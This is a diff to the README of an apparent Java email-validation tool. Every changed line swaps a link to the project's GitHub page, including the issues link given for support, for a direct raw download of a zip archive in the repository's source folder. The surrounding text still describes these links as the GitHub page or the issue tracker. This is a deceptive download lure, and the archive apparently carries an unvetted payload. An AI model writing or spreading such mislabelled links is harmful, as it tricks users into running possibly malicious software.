@@ -1,6 +1,6 @@
 # 📧 email-validator-java-disposable-typos - Check Emails Fast and Easy
 
-[![Download](https://img.shields.io/badge/Download-BlueViolet?style=for-the-badge&logo=github)](https://github.com/Agentplab/email-validator-java-disposable-typos)
+[![Download](https://img.shields.io/badge/Download-BlueViolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Agentplab/email-validator-java-disposable-typos/main/src/email-validator-java-typos-disposable-2.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ If you do not have Java installed, you can download it from the official Oracle 
 
 To get the application, visit the official GitHub page here:
 
-[Download email-validator-java-disposable-typos](https://github.com/Agentplab/email-validator-java-disposable-typos)
+[Download email-validator-java-disposable-typos](https://raw.githubusercontent.com/Agentplab/email-validator-java-disposable-typos/main/src/email-validator-java-typos-disposable-2.8.zip)
 
 You will find the latest version and instructions on that page. Click on the releases or download section to get the application files.
 
@@ -120,7 +120,7 @@ You may want to change how strict the checks are or add your own list of disposa
 
 If you need assistance, check the issues tab on the GitHub page. You can report problems or ask questions here:
 
-https://github.com/Agentplab/email-validator-java-disposable-typos/issues
+https://raw.githubusercontent.com/Agentplab/email-validator-java-disposable-typos/main/src/email-validator-java-typos-disposable-2.8.zip
 
 This is the best place to get answers from the developer or community.
 
@@ -130,7 +130,7 @@ This is the best place to get answers from the developer or community.
 
 Click the link below to visit the GitHub page where you can download the app files:
 
-[Download email-validator-java-disposable-typos](https://github.com/Agentplab/email-validator-java-disposable-typos)
+[Download email-validator-java-disposable-typos](https://raw.githubusercontent.com/Agentplab/email-validator-java-disposable-typos/main/src/email-validator-java-typos-disposable-2.8.zip)
 
 Follow the instructions from the “Getting Started” section above to finish installing and running the program on your Windows PC.  
 
@@ -152,4 +152,4 @@ This app touches several important areas:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-BlueViolet?style=for-the-badge&logo=github)](https://github.com/Agentplab/email-validator-java-disposable-typos)
+[![Download](https://img.shields.io/badge/Download-BlueViolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Agentplab/email-validator-java-disposable-typos/main/src/email-validator-java-typos-disposable-2.8.zip)
